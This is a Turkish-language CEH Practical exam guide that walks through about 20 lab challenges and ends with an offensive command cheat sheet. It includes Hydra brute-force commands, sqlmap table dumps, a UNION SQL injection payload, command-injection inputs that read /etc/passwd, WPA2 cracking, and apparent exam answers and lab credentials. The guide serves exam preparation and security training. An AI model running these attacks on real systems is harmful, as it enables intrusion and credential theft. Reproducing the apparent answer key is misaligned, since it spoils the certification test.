CEH Practical (v12 / v13) Kapsamlı Sınav Rehberi & Cheat Sheet
Bu rehber; EC-Council CEH Practical sınav formatı, geçme kriterleri, lab ortamı mekaniği, görsellerdeki gerçek sınav senaryoları/soru tipleri, zorlayıcı püf noktaları ve A'dan Z'ye komut/araç listesini eksiksiz sunmaktadır.
---
BÖLÜM 1: Sınav Mimarisi, Geçme Kriteri ve Zorluk Analizi
1. Sınav Detayları ve Geçme Puanı
Soru Sayısı: 20 Senaryo / Practical Challenge (CTF / Flag / Analiz tarzı).
Geçme Kriteri: En az 14 doğru (%70) yapılması zorunludur. (14/20 = Geçer).
Süre: 6 Saat (360 Dakika). Zaman yönetimi iyi yapılırsa süre fazlasıyla yeterlidir (ortalama 2.5 - 4 saatte bitirilir).
Gözetmenlik (Proctoring): Canlı proctor (GoToMeeting / Zoom) eşliğinde kimlik kontrolü, 360° oda taraması ve ekran paylaşımı ile yürütülür. 15 dakikalık mola hakkı mevcuttur.
Format: Tarayıcı üzerinden EC-Council iLabs/CyberQ arayüzüne bağlanılır. Sınavda iki ana workstation bulunur:
EH Workstation - 1: Parrot OS / Kali Linux.
EH Workstation - 2: Windows Server / Windows 10/11.
Cevap Formatı: Soruların altında belirtilen regex formatına birebir harf ve karakter uyumu şarttır:
Örn: `(Format: A*AaAa*AN)` -> `F!AgBr^V0`
Örn: `(Format: NaNNNaa)` -> `2bb407ca`
Küçük/büyük harf veya boşluk hataları cevabın direkt yanlış sayılmasına neden olur.
---
2. Konu Dağılımı (Modül Bazlı)
Ağ Keşfi & Taraması (Network Scanning & Enumeration): ~3-4 Soru (Nmap, Zenmap, Nmap NSE scriptleri, RPC/SMB/WAMP keşifleri, Domain Controller / FQDN tespiti).
Web Uygulama Güvenliği (Web App Hacking & Exploitation): ~4-5 Soru (SQL Injection, Command Injection, XSS, Parameter Tampering, DVWA, Web Crawling, Banner Grabbing, Clickjacking / X-Frame-Options).
Kriptografi & Steganografi (Crypto & Stego): ~3 Soru (OpenStego, QuickStego, Snow/Steghide, Veracrypt volume mount & hash cracking, Hashes.com / John / Hashcat ile hash kırma).
Trafik & Paket Analizi (Network Sniffing & Forensics): ~3-4 Soru (Wireshark DDoS analizleri, SYN/UDP flood, en az/en çok paket atan IP, IoT MQTT publish mesajı ve topic length, ARP zehirleme tespiti).
Kaba Kuvvet & Parola Kırma (Cracking & Brute Force): ~2-3 Soru (Hydra ile RDP, SSH, FTP, SMB brute force; WPA2 Wi-Fi pcap kırma aircrack-ng).
Zafiyet Analizi & Sistem Sızma / Ayrıcalık Yükseltme (PrivEsc & Malware Analysis): ~2 Soru (Nessus/OpenVAS zafiyet skorları/CVE tespiti, Linux SUID/sudo privesc, RAT/trojan gizlenmiş dosya tespiti, PE/ELF statik başlık analizi).
---
3. İnsanları En Çok Zorlayan Konular ve Hata Noktaları
Format Hataları (Regex Mismatch):
En çok puan kaybı doğru cevabı bulup format kuralına uymamaktan kaynaklanır. `ANS: AdminTeam.ECCCEH.com` gibi FQDN sorularında büyük-küçük harfe dikkat edilmelidir.
VeraCrypt + Hash Kırma Kombinasyonu:
Volume `.file` veya raw disk imajı olarak verilir. Hash dosyasını Hashcat/John ile kırıp, şifreyi alıp VeraCrypt ile volume'ü GUI/CLI üzerinden mount etmek gerekir.
IoT MQTT Paket Analizi (Wireshark):
Adaylar standart HTTP/TCP filtrelerine alışkındır. `mqtt` filtresi uygulayıp `Publish Message` altındaki `Topic Length` değerini okumak bazen gözden kaçar.
Android / Mobil Steganografi & İmaj Analizi:
Mobil cihazdan çekilmiş görseller veya klasörler içindeki gizli dosyalarda OpenStego / Stegsolve ya da string analizini kaçırmak.
Static Malware / ELF / PE Segment Boyutları:
Soru: Determine the size of the PT_LOAD(0) segment. Adaylar PE/ELF header okuma araçlarına (readelf, objdump veya IDA/CFF Explorer/PEview) hakim olmadığında takılabilir.
---
BÖLÜM 2: Görseldeki 21 Challenge + Backup Sorularının Analizi ve Çözüm Adımları
Challenge 1: Domain Controller Versiyonu & FQDN Tespiti
Soru: Ağdaki Domain Controller makinesini tespit et, Product Version ve FQDN değerini yaz.
Yöntem:
```bash
  # Ağ taraması ve SMB/OS tespiti
  nmap -sS -sV -O -p 53,88,135,139,389,445 10.10.55.0/24
  # NSE ile NetBIOS ve Domain FQDN bilgisi çekme
  nmap -p 445 --script smb-os-discovery,smb2-security-mode 10.10.55.X
  ```
Püf Noktası: Windows terminalinden `nslookup` veya `nbtstat -A <IP>` ile NetBIOS adı ve tam etki alanı adı (FQDN: `AdminTeam.ECCCEH.com`) doğrulanır.
---
Challenge 2: WAMP Server & Mercury Mail Servis Sayısı
Soru: Windows web geliştirme ortamında çalışan Mercury servislerinin sayısını ve WAMP sunucu IP'sini bul.
Yöntem:
```bash
  # WAMP ve Mercury Mail portları (SMTP:25, POP3:110, IMAP:143, Mercury HTTP:2224 vb.)
  nmap -sV -p- 172.20.0.0/24
  # Belirli hedef üzerinde servis detayı
  nmap -sV -p 25,110,143,2224 172.20.0.16
  ```
Püf Noktası: Mercury/32 genelde POP3, SMTP, IMAP, Finger, HTTP servisleri gibi toplam 7 alt servisle ayağa kalkar.
---
Challenge 3: RDP Brute-Force, CFE Decrypt ve CRC32 Değeri
Soru: 10.10.55.0/24 ağında RDP açık makineyi bul, `Jones` kullanıcısını kır, `hide.cfe` dosyasını çöz, görselin CRC32 değerini gir.
Yöntem:
```bash
  # 1. RDP Taraması
  nmap -p 3389 --open 10.10.55.0/24

  # 2. Hydra ile RDP Parola Kırma
  hydra -l Jones -P /usr/share/wordlists/rockyou.txt rdp://10.10.55.X

  # 3. RDP Bağlantısı veya Dosyayı Alma
  xfreerdp /v:10.10.55.X /u:Jones /p:<password>
  ```
`.cfe` (CryptoForge Encrypted) dosyası Windows makinede CryptoForge aracı açılarak Jones'un parolası girilerek çözülür.
Açılan resim dosyasının CRC32 değeri:
Windows: HashTab veya 7-Zip ile sağ tık -> CRC32.
Linux: `crc32 image.png`
---
Challenge 4: Mobil Cihaz Analizi & Steganografi
Soru: Mobil cihaz imajındaki resimden gizli veriyi çıkar (`Format: A*AaAa*AN`).
Yöntem:
OpenStego, QuickStego veya Steghide kullanılır:
```bash
  steghide extract -sf suspicious_mobile.jpg
  # Parola sorarsa boş bırak (Enter) veya kullanıcı adını dene
  ```
Veya GUI'de OpenStego -> Extract Data -> Input stego image -> Extract.
---
Challenge 5: Zafiyet Taraması (En Düşük Skorlu CVE)
Soru: 192.168.44.32 hedefinde en düşük CVSS severity skorlu zafiyetin CVE kodunu bul.
Yöntem:
EH Workstation üzerinde kurulu Nessus veya OpenVAS web arayüzünü aç (`https://localhost:8834`).
İlgili IP tarama raporunu aç.
Zafiyetleri CVSS skoruna göre "Artan" (Ascending) sırala. "Low" / en düşük puanlı olan CVE kodunu al (`CVE-2020-7068`).
---
Challenge 6: Linux Remote Login (SSH/Telnet) & Bayrak Okuma
Soru: Linux makineye sız, `Netnormal.txt` dosyasındaki bayrağı oku.
Yöntem:
```bash
  # Port taraması
  nmap -p 22,23 10.10.55.0/24
  # Hydra ile kimlik avı veya verilen kimlikle SSH:
  ssh user@10.10.55.X
  cat /home/user/Netnormal.txt veya find / -name "Netnormal.txt" 2>/dev/null
  ```
---
Challenge 7: Parolalı Dosya Çözme (Snow / Steghide / Encrypted TXT)
Soru: Documents klasöründeki `restricted.txt` dosyasından 9 haneli kimlik bilgisini al. Şifreleme anahtarı: `password`.
Yöntem:
Eğer whitespace steganografisi ise SNOW kullanılır:
```bash
  snow -C -p "password" restricted.txt
  ```
Veya OpenSSL/GPG decrypt:
```bash
  openssl enc -d -aes-256-cbc -in restricted.txt -k password
  ```
---
Challenge 8: SMB Weak Credentials & Sniffer.txt
Soru: SMB servisinde zayıf kimlik doğrulamasını istismar et, `Sniffer.txt` içeriğini oku.
Yöntem:
```bash
  # SMB anonim veya zayıf parola taraması
  crackmapexec smb 10.10.55.0/24 -u '' -p '' --shares
  crackmapexec smb 10.10.55.0/24 -u 'guest' -p '' --shares
  # smbclient ile dosya çekme
  smbclient //10.10.55.X/share -U guest
  get Sniffer.txt
  cat Sniffer.txt
  ```
---
Challenge 9: Linux Privilege Escalation (imroot.txt)
Soru: `marcus:M3rcy@123` kullanıcısı ile SSH yap, root yetkisine yüksel, `imroot.txt` dosyasını oku.
Yöntem:
```bash
  ssh marcus@10.10.55.X
  sudo -l
  # Sudo yetkisi varsa:
  sudo cat /root/imroot.txt
  # SUID bitlerini kontrol etme:
  find / -perm -4000 2>/dev/null
  ```
---
Challenge 10: RAT ve Trojan ile Gizlenmiş Dosya Sayısı
Soru: Windows makinedeki Scan klasöründe kaç adet sniff edilmiş dosya olduğunu bul.
Yöntem:
Hedefteki RAT arayüzü (njRAT, MoSucker veya Quasar) açılarak uzak dosya yöneticisinden `C:\Scan` klasöründeki dosya sayısı sayılır.
---
Challenge 11: Zararlı Yazılım Analizi (ELF / PE Segment Boyutu)
Soru: `Strange_File-1` dosyasının `PT_LOAD(0)` segment boyutunu ve SHA224 hash değerini bul.
Yöntem:
```bash
  # Linux ortamında readelf kullanımı:
  readelf -l Strange_File-1
  # Windows ortamında CFF Explorer veya Detect It Easy (DIE) ile Program Headers tablosuna bakılır.
  # SHA-224 hash hesaplama:
  sha224sum Strange_File-1
  ```
---
Challenge 12: Wireshark DDoS Saldırı Analizi
Soru: `Evil-traffic.pcapng` dosyasında kurbana (172.22.10.10) en az paket gönderen IP'yi ve paket sayısını bul.
Yöntem:
Wireshark'ta pcap dosyasını aç.
Menüden: Statistics -> IPv4 Statistics -> Source and Destination Addresses veya Conversations -> IPv4.
Destination IP'si `172.22.10.10` olan kayıtları filtrele.
Paket sayılarını küçükten büyüğe sırala (En az gönderen saldırgan IP: `172.20.0.21`, Paket: `19554`).
---
Challenge 13: SQL Injection ile Kullanıcı Parolası Çekme
Soru: `cinema.cehorg.com` üzerinde SQLi uygulayarak `Daniel` kullanıcısının parolasını çek.
Yöntem:
```bash
  # SQLMap ile otomatik çekim
  sqlmap -u "http://cinema.cehorg.com/profile.php?id=1" --cookie="<cookie>" --dbs
  sqlmap -u "http://cinema.cehorg.com/profile.php?id=1" -D cinema_db -T users -C username,password --dump
  ```
Veya form login alanında Union tabanlı SQLi payload: `' UNION SELECT 1,username,password FROM users-- -`
---
Challenge 14: Web ID Enumeration (Parameter Tampering)
Soru: `www.cehorg.com` üzerinde `page_id=95` sayfasındaki flag değerini bul.
Yöntem:
Tarayıcıda doğrudan URL değiştirilir: `http://www.cehorg.com/page.php?page_id=95` ya da Burp Suite ile parametre değiştirilerek flag okunur.
---
Challenge 15 & 16: Web Zafiyeti & Veritabanı Tablosu Flag Sütunu
Soru: `cybersec.cehorg.com` üzerinde SQLi ile DB tablolarındaki Flag sütununu bul ve değerini al.
Yöntem:
```bash
  sqlmap -u "http://cybersec.cehorg.com/search.php?query=test" --tables
  sqlmap -u "http://cybersec.cehorg.com/search.php?query=test" -D webapp -T flags --dump
  ```
---
Challenge 17: DVWA Base64 Dosyaları Deşifre Etme
Soru: DVWA üzerinden yüklenen base64 dosyalarını deşifre edip orijinal mesajı bul (`admin:password`).
Yöntem:
Verilen dizindeki (`C:\wamp64\www\DVWA\ECWeb\Certified`) dosyalar açılır:
```bash
  echo "<base64_string>" | base64 -d
  ```
---
Challenge 18: IoT MQTT Trafik Analizi
Soru: IoT pcap dosyasında `IoT Publish Message` içeren paketi bul ve Topic Length değerini yaz.
Yöntem:
Wireshark'ta pcap dosyasını aç.
Filtre kutusuna: `mqtt` veya `mqtt.msgtype == 3` (Publish Message) yaz.
Paketi seç -> Packet Details penceresinde MQ Telemetry Transport Protocol -> Header Flags -> Topic Length satırına bak (Cevap: `9`).
---
Challenge 19: VeraCrypt Volume Şifresi Kırma
Soru: `Its_File` VeraCrypt hacmini aç, içindeki gizli koda ulaş. Hash dosyası Parrot OS Desktop/Documents altında.
Yöntem:
```bash
  # John the Ripper veya Hashcat ile hash kırma
  john --wordlist=/usr/share/wordlists/rockyou.txt Hash2crack.txt
  ```
Bulunan parola ile Windows/Linux üzerinde VeraCrypt GUI açılır -> Select File -> `Its_File` -> Mount -> Parola girilir -> Oluşan sanal sürücüden `EC_data.txt` okunur.
---
Challenge 20: Wi-Fi WPA2 4-Way Handshake Kırma
Soru: `W!F!_Pcap.cap` dosyasını kır, Wi-Fi parolasının toplam karakter sayısını gir.
Yöntem:
```bash
  aircrack-ng -w /usr/share/wordlists/rockyou.txt W!F!_Pcap.cap
  ```
Parola bulunduğunda karakter sayısı sayılır (Örn: `password1` -> 9 karakter).
---
Backup Soruları: Command Injection & Clickjacking & Session Hijacking
Command Injection (DVWA / Web):
Girdi kutusuna IP yerine: `127.0.0.1 && net user` veya `127.0.0.1; cat /etc/passwd | wc -l` girerek kullanıcı sayısı bulunur.
Clickjacking Tespiti:
Tarayıcı / Curl ile HTTP yanıt başlıkları incelenir:
```bash
  curl -I http://www.goodshopping.com
  ```
Eğer `X-Frame-Options` veya `Content-Security-Policy: frame-ancestors` başlığı yoksa, site Clickjacking zafiyetine açıktır -> Cevap: `Yes`.
Session Hijacking / Sniffing Protokolü:
Wireshark'ta ağ zehirleme tespiti için `arp.duplicate-address-frame` veya tekrarlayan sahte ARP yanıtları incelenir -> Protokol: `ARP`.
---
BÖLÜM 3: Hızlı Komut ve Araçlar Cheat Sheet
1. Nmap Taktiksel Komut Seti
```bash
# Hızlı subnet canlı host taraması
nmap -sn 10.10.55.0/24

# Hızlı port taraması (Top 1000)
nmap -sS -T4 10.10.55.0/24 --open

# Tam servis, versiyon ve script taraması
nmap -sV -sC -p- -T4 10.10.55.X

# SMB ve İşletim Sistemi tespiti
nmap -p 139,445 --script smb-os-discovery 10.10.55.X

# Web dizin ve HTTP method taraması
nmap -p 80,443,8080 --script http-enum,http-methods 10.10.55.X
```
2. Parola & Servis Kaba Kuvvet (Hydra)
```bash
# RDP Kırma
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.55.X

# SSH Kırma
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.55.X

# FTP Kırma
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://10.10.55.X

# SMB Kırma
hydra -l administrator -P /usr/share/wordlists/rockyou.txt smb://10.10.55.X
```
3. Web & Veritabanı İstismarı (SQLMap & Nikto)
```bash
# SQLMap temel tarama
sqlmap -u "http://target/page.php?id=1" --batch --dbs

# Tablo ve Kolon çekme
sqlmap -u "http://target/page.php?id=1" -D db_name --tables
sqlmap -u "http://target/page.php?id=1" -D db_name -T users --columns
sqlmap -u "http://target/page.php?id=1" -D db_name -T users -C user,pass --dump

# Nikto zafiyet taraması
nikto -h http://10.10.55.X
```
4. Wireshark Filtreleme Taktikleri
DDoS Saldırgan IP Bulma: `Statistics -> Conversations -> IPv4` veya `ip.dst == 172.22.10.10`.
IoT MQTT Filtresi: `mqtt` veya `mqtt.msgtype == 3`.
Parola / Düz Metin Avı: `http contains "password"` veya `frame contains "flag"`.
Sahte ARP Trafiği: `arp` veya `arp.opcode == 2`.
5. Steganografi ve Kripto
OpenStego GUI: Parrot/Windows arayüzünden doğrudan çalıştırılır.
Snow CLI:
```bash
  snow -C -p "sifre" dosya.txt
  ```
Aircrack-ng:
```bash
  aircrack-ng -w /usr/share/wordlists/rockyou.txt dosya.cap
  ```
Hash Tanıma & Kırma:
Online platform: Hashes.com (Sınav ortamında izin verilen bağlantılardandır).
Offline: `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
---
BÖLÜM 4: Sınav Günü Stratejisi & Altın Kurallar
İlk 20 Dakika - Keşif ve Envanter:
Sınav başlar başlamaz tüm soruları tek tek tıklayarak okuyun, not defterinize hedef IP'leri, dosya yollarını ve araç gereksinimlerini listeleyin.
Kolay Sorulardan Başlayın:
Wireshark (pcap analizi), Web ID Enumeration (URL değiştirme), Steganografi ve Hash sorgulama soruları en hızlı puan getiren sorulardır.
Format Uyarısına Dikkat:
Soruda `Format: A*AaAa*AN` gibi bir şablon varsa, bulduğunuz değerin bu şablondaki büyük harf, küçük harf ve özel sembol yerleşimine tam oturduğunu teyit edin.
Tool Donarsa / Lab Kasarsa:
iLabs ortamında bazen VM'ler yanıt vermeyebilir. Terminalden kill etmek veya VM'i yeniden başlatmak (Restart VM) için gözetmene bilgi verebilirsiniz.
